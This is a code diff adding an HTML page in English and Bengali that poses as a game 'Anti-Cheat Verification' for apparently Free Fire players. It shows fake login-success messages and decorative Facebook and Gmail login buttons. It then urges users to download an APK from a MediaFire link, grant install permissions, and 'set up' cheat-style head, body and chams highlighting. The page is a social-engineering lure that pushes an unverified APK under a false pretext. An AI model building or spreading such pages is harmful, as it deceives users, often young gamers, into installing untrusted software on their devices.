@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<title>FF Anti-Cheat Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;600&display=swap" rel="stylesheet">
+
+<style>
+body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:radial-gradient(circle at top,#001b2e,#000);
+    font-family:'Noto Sans Bengali', Arial, sans-serif;
+    color:#00eaff;
+}
+.box{
+    width:95%;
+    max-width:420px;
+    background:#050505;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 0 30px #00eaff;
+    text-align:center;
+}
+h2{
+    text-shadow:0 0 10px #00eaff;
+}
+.status{
+    margin:15px 0;
+    color:#7dffb3;
+    font-size:14px;
+}
+.btn{
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+    border:none;
+    border-radius:8px;
+    font-weight:bold;
+    cursor:pointer;
+}
+.fb{ background:#1877f2; color:white; }
+.gm{ background:#ea4335; color:white; }
+
+.hidden{ display:none; }
+
+.step{
+    margin-top:20px;
+    font-size:15px;
+    line-height:1.7;
+    color:#fff;
+}
+
+.download{ background:#00eaff; color:#000; }
+.setup{ background:#00ff9d; color:#000; }
+
+/* Modal styles */
+.modal-backdrop{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.6);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:1000;
+}
+.modal{
+    background:#0b0b0b;
+    color:#fff;
+    padding:20px;
+    border-radius:12px;
+    max-width:360px;
+    width:90%;
+    box-shadow:0 8px 30px rgba(0,0,0,0.6);
+    text-align:left;
+    font-size:15px;
+}
+.modal h3{ margin:0 0 10px 0; color:#00eaff;}
+.modal p{ margin:8px 0; line-height:1.6; }
+.modal .actions{ display:flex; gap:8px; margin-top:12px; }
+.modal .btn{ flex:1; padding:10px; border-radius:8px; }
+.modal .confirm{ background:#00eaff; color:#000; }
+.modal .cancel{ background:#333; color:#fff; }
+
+/* Setup modal styles */
+#setupModal .modal{ max-width:760px; }
+#setupModal .setup-grid{ display:flex; gap:18px; align-items:flex-start; }
+#setupModal .character-wrap{ flex:1; display:flex; flex-direction:column; align-items:center; }
+#setupModal .character{ width:200px; height:320px; display:flex; align-items:flex-start; justify-content:center; perspective:900px; }
+#character{ width:160px; transform-style:preserve-3d; animation:spin 8s linear infinite; }
+@keyframes spin{ from{ transform:rotateY(0deg); } to{ transform:rotateY(360deg); } }
+#character{ display:block; }
+.character-img-wrap{ position:relative; width:260px; height:360px; }
+#charImg{ width:100%; height:100%; object-fit:contain; display:block; border-radius:8px; background:linear-gradient(180deg,#ddd,#bbb); }
+.overlay{ position:absolute; cursor:pointer; transition: all 200ms ease; border-radius:8px; }
+#charHeadOverlay{ left:50%; top:6%; width:44%; height:22%; transform:translateX(-50%); border-radius:50%; }
+#charBodyOverlay{ left:50%; top:34%; width:68%; height:52%; transform:translateX(-50%); border-radius:12px; }
+.overlay.active{ box-shadow:0 0 18px rgba(255,0,0,0.9); background:rgba(255,0,0,0.65); }
+.chams #charImg{ box-shadow:0 0 28px 10px rgba(255,223,0,0.85); filter:brightness(1.12); }
+#setupModal .controls{ width:220px; display:flex; flex-direction:column; gap:10px; }
+#setupModal .control{ padding:12px; background:#111; border-radius:8px; text-align:center; cursor:pointer; color:#fff; border:1px solid rgba(255,255,255,0.03); }
+#setupModal .control.active{ box-shadow:0 0 12px #00eaff; transform:scale(1.03); }
+#setupModal .chams .character{ box-shadow:0 0 30px 12px rgba(255,223,0,0.95); filter:brightness(1.12); transform:scale(1.03); }
+#setupModal .hint{ font-size:13px; color:#a8bcd1; margin-top:8px; }
+</style>
+</head>
+<body>
+
+<div class="box">
+
+    <h2>🛡️ Game Anti-Cheat System</h2>
+
+    <div class="status">
+        ✔️ Game ID Login Successful<br>
+        ✔️ Nice Game ID Login
+    </div>
+
+    <button class="btn fb" onclick="verify('Facebook')">🔵 Login with Facebook</button>
+    <button class="btn gm" onclick="verify('Gmail')">🔴 Login with Gmail</button>
+
+    <div id="step2" class="hidden">
+
+        <div class="step">
+            <p>১️⃣ সেন্সি এর জন্য অ্যাপটি ডাউনলোড করে Permission দিয়ে Install করুন</p>
+            <p>২️⃣ সেন্সি টি Setup করুন</p>
+        </div>
+
+        <button class="btn download">📥 Download App</button>
+        <button class="btn setup">⚙️ Setup Sensi</button>
+
+    </div>
+
+    <!-- Download confirmation modal -->
+    <div id="downloadModal" class="modal-backdrop" role="dialog" aria-hidden="true">
+      <div class="modal" role="document">
+        <h3>অ্যাপ ডাউনলোড এবং ইন্সটল</h3>
+        <p>অ্যাপটি ডাউনলোড করে ইন্সটল করতে হবে এবং ইনস্টল পারমিশন অনুমোদন করতে হবে। নিশ্চিত হলে নিচের <strong>ডাউনলোড &amp; ওপেন</strong> বাটনে ক্লিক করুন।</p>
+        <p style="color:#ffdd57; font-size:13px;">ENJOY</p>
+        <div class="actions">
+          <button id="confirmDownload" class="btn confirm">✅ ডাউনলোড &amp; ওপেন</button>
+          <button id="cancelDownload" class="btn cancel">✖ বাতিল</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Setup Sensi modal -->
+    <div id="setupModal" class="modal-backdrop" role="dialog" aria-hidden="true">
+      <div class="modal" role="document">
+        <h3>সেন্সি সেটআপ</h3>
+        <div class="setup-grid">
+          <div class="character-wrap">
+            <div class="character" id="character">
+              <div class="character-img-wrap">
+                <img src="character.png" id="charImg" alt="character" />
+                <div id="charHeadOverlay" class="overlay" title="Head" aria-hidden="false"></div>
+                <div id="charBodyOverlay" class="overlay" title="Body" aria-hidden="false"></div>
+              </div>
+            </div>
+            <div class="hint">চরিত্র: হেড/বডি ক্লিক করুন অথবা ডান দিকের কন্ট্রোল ব্যবহার করুন</div>
+          </div>
+          <div class="controls">
+            <div class="control" data-target="head">🥷 Head — হেড (রেড করে)</div>
+            <div class="control" data-target="body">🧥 Body — বডি (রেড করে)</div>
+            <div class="control" data-target="chams">✨ Chams — গ্লো (হলুদ)</div>
+          </div>
+        </div>
+        <div class="actions" style="margin-top:12px;"><button id="closeSetup" class="btn cancel">✖ বন্ধ</button></div>
+      </div>
+    </div>
+
+</div>
+
+<script>
+const uid = localStorage.getItem("ratan_userid");
+const session = localStorage.getItem("ratan_session");
+
+if(!uid || !session){
+    location.href="index.html";
+}
+
+function verify(type){
+    // fake admin log (future firebase push)
+    console.log("Verification used:", type);
+
+    document.querySelector(".fb").style.display="none";
+    document.querySelector(".gm").style.display="none";
+    document.getElementById("step2").classList.remove("hidden");
+}
+
+// Download modal behavior (Bangla popup)
+(function(){
+    const downloadBtn = document.querySelector('.download');
+    const modal = document.getElementById('downloadModal');
+    const confirmBtn = document.getElementById('confirmDownload');
+    const cancelBtn = document.getElementById('cancelDownload');
+    const apkUrl = 'https://www.mediafire.com/file/lueswr8ugkzi64g/XUJXYO.apk/file';
+
+    if(!downloadBtn || !modal) return;
+
+    downloadBtn.addEventListener('click', function(e){
+        // show modal with Bangla instruction
+        modal.style.display = 'flex';
+        modal.setAttribute('aria-hidden','false');
+        // focus for accessibility
+        confirmBtn && confirmBtn.focus();
+    });
+
+    cancelBtn && cancelBtn.addEventListener('click', function(){
+        modal.style.display = 'none';
+        modal.setAttribute('aria-hidden','true');
+    });
+
+    // click outside modal to close
+    modal.addEventListener('click', function(ev){
+        if(ev.target === modal){
+            modal.style.display = 'none';
+            modal.setAttribute('aria-hidden','true');
+        }
+    });
+
+    confirmBtn && confirmBtn.addEventListener('click', function(){
+        // Open the APK link in a new tab; users must verify before installing
+        window.open(apkUrl, '_blank', 'noopener');
+        modal.style.display = 'none';
+        modal.setAttribute('aria-hidden','true');
+    });
+})();
+
+// Setup modal behavior (character controls)
+(function(){
+    const setupBtn = document.querySelector('.setup');
+    const modal = document.getElementById('setupModal');
+    const closeBtn = document.getElementById('closeSetup');
+    const char = document.getElementById('character');
+    const charImg = document.getElementById('charImg');
+    const head = document.getElementById('charHeadOverlay');
+    const body = document.getElementById('charBodyOverlay');
+    const controls = modal ? modal.querySelectorAll('.control') : [];
+
+    if(!setupBtn || !modal) return;
+
+    setupBtn.addEventListener('click', function(){
+        modal.style.display = 'flex';
+        modal.setAttribute('aria-hidden','false');
+    });
+
+    closeBtn && closeBtn.addEventListener('click', function(){
+        modal.style.display = 'none';
+        modal.setAttribute('aria-hidden','true');
+    });
+
+    modal.addEventListener('click', function(ev){
+        if(ev.target === modal){
+            modal.style.display = 'none';
+            modal.setAttribute('aria-hidden','true');
+        }
+    });
+
+    // overlay interactions
+    const toggleHead = () => {
+        const active = head.classList.toggle('active');
+        // sync control states
+        controls.forEach(c => { if(c.dataset.target === 'head') c.classList.toggle('active', active); });
+    };
+    const toggleBody = () => {
+        const active = body.classList.toggle('active');
+        controls.forEach(c => { if(c.dataset.target === 'body') c.classList.toggle('active', active); });
+    };
+
+    // click overlays directly
+    head && head.addEventListener('click', toggleHead);
+    body && body.addEventListener('click', toggleBody);
+
+    controls.forEach(function(c){
+        c.addEventListener('click', function(){
+            const t = c.dataset.target;
+
+            if(t !== 'chams'){
+                // deactivate other non-chams controls
+                controls.forEach(x => { if(x.dataset.target !== 'chams') x.classList.remove('active'); });
+                c.classList.add('active');
+            }
+
+            if(t === 'head'){
+                toggleHead();
+            } else if(t === 'body'){
+                toggleBody();
+            } else if(t === 'chams'){
+                const active = char.classList.toggle('chams');
+                c.classList.toggle('active', active);
+            }
+        });
+    });
+})();
+</script>
+
+</body>
+</html>
